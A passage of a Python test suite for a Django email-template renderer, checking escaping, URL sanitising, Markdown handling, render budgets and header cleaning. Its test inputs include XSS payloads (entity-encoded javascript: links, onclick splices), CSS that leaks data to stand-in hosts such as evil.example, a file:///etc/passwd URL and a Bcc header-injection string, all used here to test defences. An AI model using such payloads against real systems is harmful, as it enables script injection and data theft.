        html, compiled_expression(HTML_ENGINE), conditional_comments=True)
    assert check_html(html, compiled_expression(HTML_ENGINE)) or "<!--" not in html


def test_only_a_layout_carries_outlooks_comments(plain: Any) -> None:
    """D2: the kind's fact decides; a template, block or part carrying one is refused."""

    del plain
    assert _refusals(_unsaved("layout", "outlook", source=OUTLOOK_DPI + PLAIN_LAYOUT, text_source=PLAIN_TEXT)) == []
    for row in (_unsaved(format="html", source=OUTLOOK_DPI, text_source="x"),
                _unsaved("block", "outlook", source=OUTLOOK_DPI, text_source="x")):
        assert any("a layout alone holds Outlook's" in refusal for refusal in _refusals(row)), row.kind


def test_static_url_as_decoded() -> None:
    """A static link is judged as a browser follows it: html.parser decodes the entities first (q12)."""

    for href in ("javascript&#58;alert(1)", "javascript&colon;alert(1)", "java&#x09;script:alert(1)",
                 "&#x6A;avascript:alert(1)"):
        assert check_html(f'<a href="{href}">x</a>', compiled_expression(HTML_ENGINE)), href
    assert check_html('<a href="https://example.test/">x</a>', compiled_expression(HTML_ENGINE)) == []


def test_if_splice_refused(plain: Any) -> None:
    """An if whose ends sit in attributes of different elements would join them when false (q16)."""

    del plain
    source = ('<meta name="x" content="{% if x %}"><p>hidden</p>'
              '<b title="{% endif %}" lang="en">t</b>')
    assert any("whole tag pair" in message for message in _refusals(_unsaved(
        format="html", text_source="x", source=source, variables={"x": "x"})))


# ---------- the Markdown pass ----------


@pytest.mark.parametrize(
    ("source", "refusal"),
    [
        pytest.param("Use `{{ name }}` here.", "code inline", id="span-in-code-span"),
        pytest.param("`{% if a %}`\n\n- item\n- `{% endif %}`\n", "code inline", id="pair-torn-through-code"),
        pytest.param("{% if a %}\n\n```\n{% endif %}\n```\n", "fence", id="fenced-code-holds-endif"),
        pytest.param("{% if a %}\n\nText\n\n    {% endif %}\n", "code block", id="indented-code-holds-endif"),
        pytest.param("```{%endif%}\nx\n```\n", "fence", id="fence-info"),
        pytest.param('[x](https://example.test "{{ name }}")', "link open", id="link-title"),
        pytest.param("Write &#123;&#123; to show braces.", "text holds {{", id="entity-braces"),
        pytest.param("Write &#123;&#123; name &#125;&#125; here.", "does not reach the template whole",
                     id="entity-span"),
        pytest.param("Write \\{\\{ name \\}\\} here.", "does not reach the template whole", id="backslash-braces"),
        pytest.param('`{% include "parts/p" only %}`', "code inline", id="code-span-with-quotes"),
        pytest.param("![logo]({{ name }})", "an image's source is an output", id="image-of-an-output"),
        pytest.param("{% for i in items %}\n- {{ i }}\n{% endfor %}", "different Markdown blocks",
                     id="list-swallows-endfor"),
        pytest.param("Intro {% if a %} for VIPs\n\n## Heading {% endif %}", "different Markdown blocks",
                     id="paragraph-to-heading"),
        pytest.param('Hi {% include "parts/p" only %}', "not alone in its paragraph", id="include-inline"),
    ],
)
def test_markdown_code_tokens(plain: Any, source: str, refusal: str) -> None:
    """Template code reaches the engine only as a span of its own, kept whole (p4, q13)."""

    del plain
    _row("part", "p", source="P.")
    refusals = _refusals(_unsaved(source=source, variables={"name": "x", "a": "x", "items.*": "x"}))
    assert any(refusal in message for message in refusals), refusals


def test_markdown_spans_reach_the_engine_whole(plain: Any, kit: Any) -> None:
    """Property 7: quotes, comparison signs and filter arguments survive the Markdown pass."""

    del plain
    template = _mail(
        "{% if count > 2 and name != 'Bo' %}Many{% endif %} **{{ name|truncatechars:3 }}** "
        "[Open]({{ link }}) {% templatetag openvariable %} {# note #}\n\n"
        "{% comment %}\n\n# Hidden {{ name }}\n\n{% endcomment %}\n\nShown",
        {"count": "x", "name": "x", "link": "x"},
    )
    rendered = _render(template, {"count": 3, "name": "Ana Lima", "link": "https://example.test/a?b=1&c=2"}, kit)
    assert "Many <strong>An…</strong>" in rendered.html
    assert 'href="https://example.test/a?b=1&amp;c=2"' in rendered.html
    assert "{{" in rendered.html and "Hidden" not in rendered.html and "<p style=\"margin:0 0 16px\">Shown</p>" in (
        rendered.html)
    assert "Many An… Open (https://example.test/a?b=1&c=2) {{" in rendered.plain_text


def test_the_plain_text_form_is_written_from_the_markdown(plain: Any, kit: Any) -> None:
    """The plain-text body comes from the Markdown tokens: links as ``label (url)``, items, quotes, code."""

    del plain
    template = _mail(
        "# Title\n\nSome *text*, a [link](https://example.test/a) and [mine]({{ link }}).\n\n"
        "{% if link %}\n\n- one\n- two\n\n{% endif %}\n\n1. first\n2. second\n\n> quoted\n> line\n\n    code\n",
        {"link": "x"},
    )
    rendered = _render(template, {"link": "https://example.test/b"}, kit)
    assert rendered.plain_text == (
        "Title\n\nSome text, a link (https://example.test/a) and mine (https://example.test/b).\n\n"
        "- one\n- two\n\n1. first\n2. second\n\n> quoted\n> line\n\ncode\n"
    )
    assert "<h1" in rendered.html and "<ol" in rendered.html and "<blockquote" in rendered.html


def test_reference_definitions_off(plain: Any) -> None:
    """A link reference definition is text, never expanded at each use (q3), and entities count in the form (q3b)."""

    del plain
    title = ("{{" * 30 + "x" * 1_000)[:980]
    source = f'[r]: /u "{title}"\n\n' + "\n".join(["[r]" * 30] * 40)
    started = time.process_time()
    refusals = _refusals(_unsaved(source=source))
    assert any("text holds {{" in message for message in refusals), refusals
    assert not any("form holds over 60" in message for message in refusals), refusals
    assert time.process_time() - started < 0.5
    with system_context(reason="tests.messaging_templates.render.forms"):
        forms = TemplateWalker().check(_unsaved(source="[r]: /u\n\n[r] and [r]")).forms
    assert forms is not None and "<a" not in forms.html and "[r]: /u" in forms.html


def test_values_never_become_markdown(plain: Any, kit: Any) -> None:
    """Property 2: a value is one token to the Markdown pass; raw HTML in the source is text."""

    del plain
    template = _mail("Hello {{ name }}, welcome. Hi <b onclick=x>there</b>", {"name": "x"})
    value = "[Win](https://evil.example) **x** <b>y</b>\n\n# Urgent"
    rendered = _render(template, {"name": value}, kit)
    assert "evil.example</a>" not in rendered.html and "<strong>" not in rendered.html and "<h1" not in rendered.html
    assert "&lt;b&gt;y&lt;/b&gt;" in rendered.html and "&lt;b onclick=x&gt;there&lt;/b&gt;" in rendered.html
    assert value in rendered.plain_text
    assert any("does not compile" in message for message in _refusals(_unsaved(
        source="{% verbatim %}{{ x }}{% endverbatim %}")))


# ---------- values ----------


class _Reading(HTMLParser):
    """What a mail client reads of a rendered body: elements, attributes, comments and CSS; text set aside.

    Read twice, with scripting off and on, since a ``<noscript>`` element's content is markup to one reader and
    text to the other.
    """

    def __init__(self, *, scripting: bool) -> None:
        super().__init__(convert_charrefs=True, scripting=scripting)
        self.markup: list[tuple[Any, ...]] = []
        self.css: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag != "br":  # linebreaksbr writes <br> after escaping, as it may
            self.markup.append(("start", tag, tuple(attrs)))

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag: str) -> None:
        if tag != "br":
            self.markup.append(("end", tag))

    def handle_data(self, data: str) -> None:
        if self.cdata_elem == "style":
            self.css.append(data)

    def handle_comment(self, data: str) -> None:
        self.markup.append(("comment", data))

    def handle_decl(self, decl: str) -> None:
        self.markup.append(("decl", decl))

    def unknown_decl(self, data: str) -> None:
        self.markup.append(("decl", data))

    def handle_pi(self, data: str) -> None:
        self.markup.append(("pi", data))


MARKER = "MARKER"


def _assert_value_stays_text(marker_html: str, hostile_html: str, value: str) -> None:
    """Property 1: ``value`` adds no element, attribute, comment or CSS, and reaches a link only through ``url``.

    ``marker_html`` is the same rows rendered with :data:`MARKER` for the value. Every element and attribute is
    the same in both, so is every ``<style>`` text, and an attribute value differs only where the HTML checks
    admit an output (``title``, ``alt``…) or in ``href`` and ``src`` as ``url`` makes a link of the value.
    """

    for scripting in (False, True):
        marker, hostile = _Reading(scripting=scripting), _Reading(scripting=scripting)
        for reading, html in ((marker, marker_html), (hostile, hostile_html)):
            reading.feed(html)
            reading.close()
        assert hostile.css == marker.css, (hostile.css, marker.css)
        assert [event[:2] for event in hostile.markup] == [event[:2] for event in marker.markup], hostile_html
        for before, after in zip(marker.markup, hostile.markup, strict=True):
            if before[0] != "start":
                assert after == before
                continue
            assert [name for name, _ in after[2]] == [name for name, _ in before[2]], (before, after)
            for (name, was), (_, now) in zip(before[2], after[2], strict=True):
                if name in OUTPUT_ATTRIBUTES or (name in LINK_ATTRIBUTES and (was, now) == (url(MARKER), url(value))):
                    continue
                assert now == was, (before[1], name, was, now)


class _Rows:
    """A reader over unsaved rows, so a property walks rows without writing them."""

    def __init__(self, *rows: Any) -> None:
        self.rows = {row.handler.template_name(row.key): row for row in rows}

    def named_rows(self, names: Iterable[str], *, language: str) -> dict[str, Any]:
        del language
        return {name: self.rows[name] for name in names if name in self.rows}

    def resolves_name(self, name: str) -> bool:
        return name in self.rows


SPLICE = "y style=color:red onclick=alert(1)"
JAVASCRIPT = "javascript:alert(document.domain)"
CSS = "}*{background:url(https://tracker.example/leak?)}@import url(https://evil.example/x.css);"

_ATTRIBUTE = st.builds(
    lambda name, quoting, value: " " + name + quoting.format(value),
    st.sampled_from(["title", "TITLE", "alt", "href", "style", "class"]),
    st.sampled_from(['="{}"', "='{}'", "={}", ' = "{}"']),
    st.sampled_from(["x", "{{ v }}", "{{ v|url }}", "{{ v|upper }}", "{% if v %}{{ v }}{% endif %}",
                     "color:{{ brand.light.text }}"]),
)
_START_TAG = st.builds(
    lambda tag, attributes, end: "<" + tag + "".join(attributes) + end,
    st.sampled_from(["p", "span", "a", "td", "style", "title", "noscript", "xmp", "textarea"]),
    st.lists(_ATTRIBUTE, max_size=3),
    st.sampled_from([">", " >", " />", ""]),
)
_HTML = st.lists(
    st.one_of(_START_TAG, st.sampled_from([
        "</p>", "</span>", "</a>", "</style>", "</title>", "</noscript>", "text", "{{ v }}", "{{ v|linebreaksbr }}",
        '"', "'", ">", "<", "&", "\n",
    ])),
    max_size=8,
).map("".join)


@settings(
    deadline=None, max_examples=150,
    suppress_health_check=[HealthCheck.function_scoped_fixture, HealthCheck.too_slow],
)
@given(
    before=_HTML, block=_HTML, after=_HTML,
    value=st.one_of(st.sampled_from([SPLICE, JAVASCRIPT, CSS, '"><b onclick=x>']), st.text(max_size=40)),
)
# The reviewers' rows: a repeated attribute name (S1), and a row that ends inside a tag or a <style> (S2).
@example(before='<span title="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
@example(before='<span TITLE="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
@example(before='<noscript><p title="</noscript><b title={{ v }}>"></p></noscript>', block="", after="", value=SPLICE)
@example(before="", block="<p>Hi</p><a", after=' href="{{ v }}" style="background:url({{ v }})">Open</a>',
         value=JAVASCRIPT)
@example(before="", block='<p>Hi</p><a title="x', after='" href="{{ v }}">Open</a>', value=JAVASCRIPT)
@example(before="", block="<p>Hi</p><style>", after="Hello {{ v }}, welcome.", value=CSS)
def test_a_value_never_becomes_markup(kit: Any, before: str, block: str, after: str, value: str) -> None:
    """Property 1, over the rows the walk admits: a value never becomes markup, an attribute, a link target or CSS.

    The rows are drawn from tags in every quoting and spelling of their attributes, raw-text elements, and a
    block that may end anywhere, included between two runs of the template's own HTML.
    """

    template = _unsaved(
        format="html", source=before + '{% include "blocks/probe" with v=v only %}' + after, text_source="{{ v }}",
        variables={"v": "x"},
    )
    rows = _Rows(template, _unsaved("layout", "plain"),
                 _unsaved("block", "probe", source=block, text_source="x", variables={"v": "x"}))
    try:
        walk = TemplateWalker(saving=True).walk(template, rows)
    except ValidationError:
        return  # a refused row never renders
    marker = walk.render({"v": MARKER}, kit=kit).html
    _assert_value_stays_text(marker, walk.render({"v": value}, kit=kit).html, value)


PROPERTY_SOURCE = (
    '<p>{{ v }}|{% with w=v %}{{ w }}{% endwith %}|{% include "blocks/echo" with x=v only %}|'
    "{% for i in items %}{{ i }}{% endfor %}|{{ v|default:'d' }}|{{ v|upper }}|{{ v|lower }}|{{ v|capfirst }}|"
    "{{ v|title }}|{{ v|truncatechars:20 }}|{{ v|truncatewords:3 }}|{{ v|linebreaksbr }}|{{ v|length }}|"
    "{{ when|date }}|{{ v|floatformat }}|{{ v|pluralize }}|{{ v|yesno }}</p>"
    '<a href="{{ v|url }}" title="{{ v }}">{{ v|url }}</a><img alt="{{ v|upper }}" src="{{ v|default:\'\'|url }}" />'
)


@settings(deadline=None, max_examples=40, suppress_health_check=[HealthCheck.function_scoped_fixture])
@given(value=st.text(max_size=60))
def test_a_value_never_becomes_markup_through_any_filter(plain: Any, kit: Any, value: str) -> None:
    """Property 1, through every filter and every path a value takes: output, alias, argument, item, default."""

    del plain
    with system_context(reason="tests.messaging_templates.render.property"):
        if not MessageTemplate.objects.filter(key="echo").exists():
            _row("block", "echo", source="<i>{{ x }}</i>", text_source="{{ x }}", variables={"x": "x"})
            _mail(PROPERTY_SOURCE, {"v": "x", "items.*": "x", "when": "x"}, format="html", text_source="{{ v }}",
                  key="tests.property")
        template = MessageTemplate.objects.get(key="tests.property")
    marker = _render(template, {"v": MARKER, "items": [MARKER], "when": "2026-11-24"}, kit).html
    for candidate in (value, SafeString(value), mark_safe("<b>" + value + "</b>")):
        rendered = _render(template, {"v": candidate, "items": [candidate], "when": "2026-11-24"}, kit)
        _assert_value_stays_text(marker, rendered.html, str(candidate))


def test_a_url_value_gives_a_link_or_nothing(plain: Any, kit: Any) -> None:
    """Property 3: unsafe schemes and every data: URL give an empty target; a quote cannot leave an attribute."""

    del plain
    template = _mail('<a href="{{ link|url }}">x</a>', {"link": "x"}, format="html", text_source="{{ link|url }}")
    for link in ("javascript:alert(1)", "JaVaScRiPt:alert(1)", "vbscript:x", "file:///etc/passwd",
                 "data:text/html,x", "data:image/png;base64,AAAA", "https://" + "a" * 2_050):
        assert 'href=""' in _render(template, {"link": link}, kit).html, link
    rendered = _render(template, {"link": 'https://example.test/" onclick="x'}, kit)
    marker = _render(template, {"link": MARKER}, kit).html
    _assert_value_stays_text(marker, rendered.html, 'https://example.test/" onclick="x')
    assert url("https://example.test/") == "https://example.test/"


def test_method_fallback_closed(plain: Any, kit: Any) -> None:
    """Property 4 (p1, q6): a lookup lands on a key; a dict's, list's or str's methods are never reached."""

    del plain
    names = ("items", "values", "keys", "popitem", "clear")
    template = _mail(
        "".join(f"[{{{{ order.{name}|default:'' }}}}]{{% if order.{name} %}}T{{% endif %}}" for name in names)
        + "{{ order.total }}",
        {**{f"order.{name}": "x" for name in names}, "order.total": "x"},
    )
    rendered = _render(template, {"order": {"total": 3, "card_last4": "4242", "email": "x@example.test"}}, kit)
    assert "[][][][][]3" in rendered.plain_text and "4242" not in rendered.html
    for source in ("{{ name.upper }}", "{{ items.clear }}", "{{ block.context }}", "{{ block.super }}"):
        assert _refusals(_unsaved(source=source, variables={"name": "x", "items.*": "x"})), source
    _row("part", "split", source="[{{ person.split|default:'' }}]", variables={"person.split": "x"})
    _row("block", "isolated", source="<b>{{ brand.name }}{{ lang }}{{ dir }}{% if secret %}{{ secret }}{% endif %}</b>",
         text_source="x", variables={"secret": "x"})
    through = _mail('{% include "parts/split" with person=recipient only %}\n\n{% include "blocks/isolated" only %}',
                    {"recipient.split": "x", "secret": "x"}, key="tests.through")
    rendered = _render(through, {"secret": "kept out"}, kit)
    assert "[]" in rendered.plain_text and "<b>Acmeenltr</b>" in rendered.html and "kept out" not in rendered.html
    assert any("both as a list and as an object" in message for message in _refusals(_unsaved(
        source="x", variables={"items.*": "x", "items.pop": "x"})))


def test_required_values_and_shapes(plain: Any, kit: Any) -> None:
    """Property 5: a required value missing or null refuses the send, naming it; shapes and JSON are checked."""

    del plain
    template = _mail(
        "{{ order.total }} [{{ note|default:'' }}] [{% if coupon %}{{ coupon }}{% endif %}]",
        {"order.total": "x", "note": "x", "coupon": "x"},
    )
    for values, refusal in (
        ({}, "order.total is required"),
        ({"order": {"total": None}}, "order.total is required"),
        ({"order": "x"}, "order is an object"),
        ({"order": {"total": object()}}, "not JSON"),
        ({"order": {"total": 1}, "brand": "x"}, "brand is a name the mail supplies"),
    ):
        with pytest.raises(ValidationError, match=refusal):
            _render(template, values, kit)
    rendered = _render(template, {"order": {"total": 3}, "coupon": None, "note": None}, kit)
    assert "3 [] []" in rendered.plain_text and "None" not in rendered.html
    rendered = _render(template, {"order": {"total": SafeString("<b>3</b>")}}, kit)
    assert "&lt;b&gt;3&lt;/b&gt;" in rendered.html


def test_variables_caps(plain: Any) -> None:
    """q1, q2, q6: a row declares at most 50 paths of 8 segments; ``D`` is one set; prepare() bounds the values."""

    del plain
    assert any("at most 50" in message for message in _refusals(_unsaved(
        source="x", variables={f"v{index}": "x" for index in range(51)})))
    assert any("more than 8" in message for message in _refusals(_unsaved(
        source="x", variables={"a.b.c.d.e.f.g.h.i": "x"})))
    _row("layout", "order", variables={"order": "x"})
    assert any("is declared and so is order.total" in message for message in _refusals(_unsaved(
        source="x", layout="order", variables={"order.total": "x"})))
    wide = _walk(_unsaved(source="{% for i in items %}{{ i.k00|default:'' }}{% endfor %}",
                          variables={f"items.*.k{index:02}": "x" for index in range(50)}))
    started = time.process_time()
    filled = wide.prepare({"items": [{} for _ in range(500)]})
    assert time.process_time() - started < 0.5
    assert len(filled["items"]) == 500 and filled["items"][0]["k49"] == ""
    walk = _walk(_unsaved(source="{% for i in items %}{{ i }}{% endfor %}", variables={"items.*": "x"}))
    for values, refusal in (
        ({"items": [0] * 501}, "501 list items"),
        ({"items": ["x" * 10_001]}, "over 10000 characters"),
        ({"items": ["x" * 9_000] * 6}, "characters of JSON"),
    ):
        with pytest.raises(ValidationError, match=refusal):
            walk.prepare(values)


def test_subject_preheader_and_plain_text(plain: Any, kit: Any) -> None:
    """Property 6: one line each; a value's markup is escaped in the title; the plain text holds values as they are."""

    del plain
    template = _mail("Hi {{ name }}.", {"name": "x"}, subject="{{ name }}\nsecond line\tend",
                     preheader="{{ name }}\r\nmore")
    rendered = _render(template, {"name": "<b>Ana</b>"}, kit)
    assert rendered.subject == "<b>Ana</b> second line end" and rendered.preheader == "<b>Ana</b> more"
    assert "<title>&lt;b&gt;Ana&lt;/b&gt; second line end</title>" in rendered.html
    assert "Hi <b>Ana</b>." in rendered.plain_text
    assert "more" not in rendered.plain_text and "{" not in rendered.plain_text


def test_written_past_clean_fails_the_render_before_it_renders(plain: Any, kit: Any) -> None:
    """Property 8: a broken row, a cycle or a broken kit seed fails render() with ValidationError; preview says so."""

    del plain
    broken = _mail("{{ x|safe }}")
    with pytest.raises(ValidationError, match="does not compile"):
        _render(broken, {}, kit)
    _row("part", "cycle", source='{% include "parts/cycle" only %}')
    cyclic = _mail('{% include "parts/cycle" only %}', key="tests.cycle")
    with pytest.raises(ValidationError, match="includes itself"):
        _render(cyclic, {}, kit)
    with system_context(reason="tests.messaging_templates.render.preview"):
        preview = cyclic.preview(kit=kit)
    assert preview.rendered is None and [warning.code for warning in preview.warnings] == [
        TemplateWarningCode.RENDER_ERROR]
    fine = _mail("Fine.", key="tests.fine")
    with system_context(reason="tests.messaging_templates.render.seed"):
        BrandKit.objects.filter(pk=kit.pk).update(brand="not a colour")
        stale = BrandKit.objects.get(pk=kit.pk)
    with pytest.raises(ValidationError):
        _render(fine, {}, stale)


def test_no_default_kit_refuses_the_render(plain: Any) -> None:
    del plain
    fine = _mail("Fine.")
    with system_context(reason="tests.messaging_templates.render.kit"):
        BrandKit.objects.filter(is_default=True).update(is_default=False)
    with pytest.raises(ValidationError, match="No brand kit is the default"):
        _render(fine, {})


def test_an_override_saved_between_two_renders_shows_in_the_second(plain: Any, kit: Any) -> None:
    del plain
    shipped = _row("part", "word", source="First.", is_baseline=True)
    template = _mail('{% include "parts/word" only %}')
    assert "First." in _render(template, {}, kit).plain_text
    with system_context(reason="tests.messaging_templates.render.edit"):
        override = MessageTemplate.objects.override(shipped)
        override.source = "Second."
        override.save()
    assert "Second." in _render(template, {}, kit).plain_text


@pytest.mark.parametrize(
    ("language", "date", "direction"),
    [
        ("en", "Nov. 24, 2026", "ltr"),
        ("es", "24 de noviembre de 2026", "ltr"),
        ("de", "24. November 2026", "ltr"),
        ("ar", "24 نوفمبر، 2026", "rtl"),
        ("he", None, "rtl"),
        ("fa", None, "rtl"),
    ],
)
def test_dates_numbers_and_direction_follow_the_rows_language(
    plain: Any, kit: Any, language: str, date: str | None, direction: str,
) -> None:
    """Property 9: each pass runs in the row's language; a date path takes a date or an aware datetime."""

    del plain
    template = _mail("{{ when|date:'DATE_FORMAT' }}|{{ dir }}|{{ ok|yesno }}", {"when": "x", "ok": "x"},
                     language=language, key="tests.dated")
    rendered = _render(template, {"when": datetime.date(2026, 11, 24), "ok": True}, kit)
    assert rendered.language == language
    assert f'dir="{direction}"' in rendered.html and f"|{direction}|" in rendered.plain_text
    if date is not None:
        assert rendered.plain_text.startswith(date)


def test_only_a_validation_error_leaves_render_and_preview(plain: Any, kit: Any) -> None:
    """Django review 2 (a3, a2, q7, q10): values the walk admits that Django's filters would raise on are refused,
    naming the path; a bare date printed with a time takes an aware datetime; preview reports the refusal."""

    del plain
    numbers = _mail("[{{ n|pluralize }}][{{ n|floatformat:2 }}][{{ n|yesno }}][{{ n }}]", {"n": "x"}, key="tests.n")
    for value in (10 ** 400, -(10 ** 400), float("inf"), float("nan")):
        with pytest.raises(ValidationError, match="n is not a number a float holds"):
            _render(numbers, {"n": value}, kit)
    assert _render(numbers, {"n": 1e308}, kit).plain_text.startswith("[s]")
    printed = {"d": "DATETIME_FORMAT", "e": "H:i", "f": "TIME_FORMAT", "g": "SHORT_DATETIME_FORMAT"}
    timed = _mail("".join(f"[{{{{ {path}|date:'{name}' }}}}]" for path, name in printed.items()),
                  dict.fromkeys(printed, "x"), key="tests.timed")
    moments = dict.fromkeys(printed, "2026-11-24T10:00:00+00:00")
    assert _render(timed, moments, kit).plain_text.count("[") == 4
    for path, name in printed.items():
        with pytest.raises(ValidationError, match=f"{path} is printed with a time \\({name}\\)"):
            _render(timed, {**moments, path: "2026-11-24"}, kit)
    dated = _mail("[{{ d|date:'DATE_FORMAT' }}]", {"d": "x"}, key="tests.far")
    for value in ("9999-12-31T23:59:59-23:59", "0001-01-01T00:00:00+23:59"):
        with pytest.raises(ValidationError, match="d is a moment the local time zone cannot hold"):
            _render(dated, {"d": value}, kit)
    epoch = _mail("[{{ d|date:'U' }}]", {"d": "x"}, key="tests.epoch")
    for zone in ("UTC", "Pacific/Kiritimati"):
        for value in ("0001-01-01", "9999-12-31", "2026-11-24"):
            with timezone.override(zoneinfo.ZoneInfo(zone)):
                try:  # The contract: a refusal is a ValidationError, never another exception.
                    _render(epoch, {"d": value}, kit)
                except ValidationError:
                    pass
    with system_context(reason="tests.messaging_templates.render.preview"):
        timed.sample = {**moments, "d": "2026-11-24"}
        preview = timed.preview(kit=kit)
    assert preview.rendered is None and [warning.code for warning in preview.warnings] == [
        TemplateWarningCode.RENDER_ERROR]
    assert "d is printed with a time" in preview.warnings[0].detail


def test_any_other_failure_in_a_pass_is_a_render_error(plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    """Whatever nobody thought of leaves render() as ValidationError(code="render_failed"), and preview reports it."""

    del plain

    def upper(value: Any) -> str:
        raise RuntimeError("a filter nobody thought of")

    upper._filter_name = "upper"  # type: ignore[attr-defined]  # what Library.filter records
    monkeypatch.setitem(register.filters, "upper", upper)
    template = _mail("{{ name|upper }}", {"name": "x"}, sample={"name": "Ana"})
    with pytest.raises(ValidationError) as raised:
        _render(template, {"name": "Ana"}, kit)
    assert raised.value.code == "render_failed"
    assert "RuntimeError: a filter nobody thought of" in raised.value.messages[0]
    with system_context(reason="tests.messaging_templates.render.preview"):
        preview = template.preview(kit=kit)
    assert preview.rendered is None
    assert preview.warnings == [TemplateWarning(TemplateWarningCode.RENDER_ERROR, raised.value.messages[0])]


def test_an_over_long_subject_is_refused_by_its_column_and_never_lexed(
    plain: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Fix 1 (Django review 3): a column over its max_length refuses the row before the walk reads it."""

    del plain
    checked: list[Any] = []
    check = TemplateWalker.check
    monkeypatch.setattr(TemplateWalker, "check", lambda walker, row: checked.append(row) or check(walker, row))
    row = _unsaved(subject="{{ a }}" * 7_000, preheader="x" * 50_000, variables={"a": "x"})
    with system_context(reason="tests.messaging_templates.render.clean"), pytest.raises(ValidationError) as raised:
        row.full_clean()
    assert {"subject", "preheader"} <= set(raised.value.message_dict) and checked == []


def test_the_values_cap_counts_characters_not_escapes(plain: Any) -> None:
    """Fix 2 (Django review 4): 50,000 characters of JSON, whatever the script; escapes are not counted."""

    del plain
    walk = _walk(_unsaved(source="{% for i in items %}{{ i }}{% endfor %}", variables={"items.*": "x"}))
    assert len(walk.prepare({"items": ["名" * 9_000] * 5})["items"]) == 5
    assert len(walk.prepare({"items": ["😀" * 9_000] * 5})["items"]) == 5
    with pytest.raises(ValidationError, match="characters of JSON"):
        walk.prepare({"items": ["名" * 9_000] * 6})


def test_subject_and_preheader_drop_control_and_bidirectional_characters(plain: Any, kit: Any) -> None:
    """Fix 3 (Django review 8, i5): NUL, C0 and C1 controls and bidi overrides never reach a header line."""

    del plain
    template = _mail("Hi.", {"name": "x"}, subject="Hi {{ name }}", preheader="{{ name }}")
    rendered = _render(template, {"name": "a\x00b\x1b[1m\u202eevil\u202c\u2066x\u2069\x85c\x9fd\r\nBcc: e"}, kit)
    assert rendered.subject == "Hi ab[1mevilx cd Bcc: e" and rendered.preheader == "ab[1mevilx cd Bcc: e"


def test_the_plain_text_body_never_reads_the_subject_or_the_preheader(plain: Any) -> None:
    """D3 (i4): subject and preheader are read in the HTML form alone, the one pass that supplies them."""

    del plain
    _row("layout", "subjected", source=PLAIN_LAYOUT,
         text_source="Subject: {{ subject }}\n\n{% block content %}{% endblock %}")
    for row in (_unsaved(layout="subjected"), _unsaved(subject="{{ preheader }}"), _unsaved(
            "layout", "other", source=PLAIN_LAYOUT, text_source="{{ preheader }}{% block content %}{% endblock %}")):
        assert any("read in the HTML form alone" in refusal for refusal in _refusals(row)), row.key
    assert _refusals(_unsaved()) == []


def test_a_date_path_parses_iso_strings_and_refuses_what_is_not_a_date(plain: Any, kit: Any) -> None:
    del plain
    template = _mail("{{ when|date:'Y-m-d' }}", {"when": "x"})
    assert _render(template, {"when": "2026-11-24"}, kit).plain_text.strip() == "2026-11-24"
    with timezone.override(zoneinfo.ZoneInfo("Europe/Berlin")):
        assert _render(template, {"when": "2026-11-24T23:30:00+00:00"}, kit).plain_text.strip() == "2026-11-25"
    for value in ("2026-11-24T15:30:00", "2026-02-30", "soon", 12):
        with pytest.raises(ValidationError, match="when is not a date"):
            _render(template, {"when": value}, kit)


# ---------- the probes, by name ----------


def test_filter_cost_caps(plain: Any, kit: Any) -> None:
    """p2, p13, q15: a long date format is refused at save, url reads 2,048 characters, every filter call charges."""

    del plain
    for refused in ("{{ d|date:'" + "r" * 21 + "' }}", "{{ d|date:'" + "r" * 190 + "_FORMAT' }}"):
        assert any("a date format" in message for message in _refusals(_unsaved(source=refused, variables={"d": "x"})))
    for admitted in ("{{ d|date:'" + "r" * 20 + "' }}", "{{ d|date:'SHORT_DATETIME_FORMAT' }}"):
        assert _refusals(_unsaved(source=admitted, variables={"d": "x"})) == []
    assert url("https://example.test/" + "é" * 2_030) == ""
    loop = _mail(
        "{% for i in items %}\n" + "\n".join(["{% with x=d|date:'rrrrrrrrrrrrrrrrrrrr' %}{% endwith %}" * 10] * 30)
        + "\n{% endfor %}",
        {"items.*": "x", "d": "x"}, format="html", text_source="x",
    )
    started = time.process_time()
    with pytest.raises(RenderBudgetExceeded):
        _render(loop, {"items": [0] * 500, "d": "2026-11-24T15:30:00+00:00"}, kit)
    assert time.process_time() - started < 1.0


def test_condition_filters_refused(plain: Any) -> None:
    """p3: an if operand runs no filter but ``length``, so a condition costs nothing a budget does not see."""

    del plain
    for source in ('{% if v|url == "x" %}{% endif %}', '{% if w|truncatechars:9 == "x" %}{% endif %}',
                   "{% if v|default:'x' %}{% endif %}"):
        assert any("an if tests" in message for message in _refusals(_unsaved(
            source=source, variables={"v": "x", "w": "x"}))), source
    assert _refusals(_unsaved(source="{% if items|length > 2 %}{% endif %}", variables={"items.*": "x"})) == []


def test_wrapper_refuses_author_blocks(plain: Any) -> None:
    """p5: the layout column names the layout; a template writes neither extends nor block."""

    del plain
    for source in ("Hi{% endblock %} tail", "Hi{% endblock %}{% block x %}X", "{% block content %}Z{% endblock %}",
                   "A{% block inner %}B{% endblock %}C", '{% extends "layouts/plain" %}'):
        assert _refusals(_unsaved(source=source)), source
    for layout in ("<p>No content</p>", "{% block content %}x{% endblock %}",
                   "{% if lang %}{% block content %}{% endblock %}{% endif %}",
                   "{% block content %}{% endblock %}{% block other %}{% endblock %}"):
        assert any("a layout holds one empty" in message for message in _refusals(_unsaved(
            "layout", "other", source=layout, text_source=PLAIN_TEXT))), layout
    assert any("block is the layout's alone" in message for message in _refusals(_unsaved(
        "block", "b", source="{% block x %}{% endblock %}", text_source="x")))


def test_nesting_before_compile(plain: Any) -> None:
    """p6: tags nest at most 16 deep, counted on the tokens; 400 levels are refused before Django compiles them."""

    del plain
    sixteen = "\n".join(["{% if a %}"] * 16) + "x" + "\n".join(["{% endif %}"] * 16)
    assert _refusals(_unsaved(source=sixteen, variables={"a": "x"}, format="html", text_source="x")) == []
    deep = "\n".join(["{% if a %}" * 25] * 16) + "\nx\n" + "\n".join(["{% endif %}" * 25] * 16)
    started = time.process_time()
    refusals = _refusals(_unsaved(source=deep, variables={"a": "x"}, format="html", text_source="x"))
    assert any("nests tags over 16" in message for message in refusals)
    assert time.process_time() - started < 0.5


def test_expression_shapes(plain: Any, kit: Any) -> None:
    """p7, q8: literals are strings or numbers; precision is parsed as floatformat parses it; filter arity holds."""

    del plain
    for source, refused in (
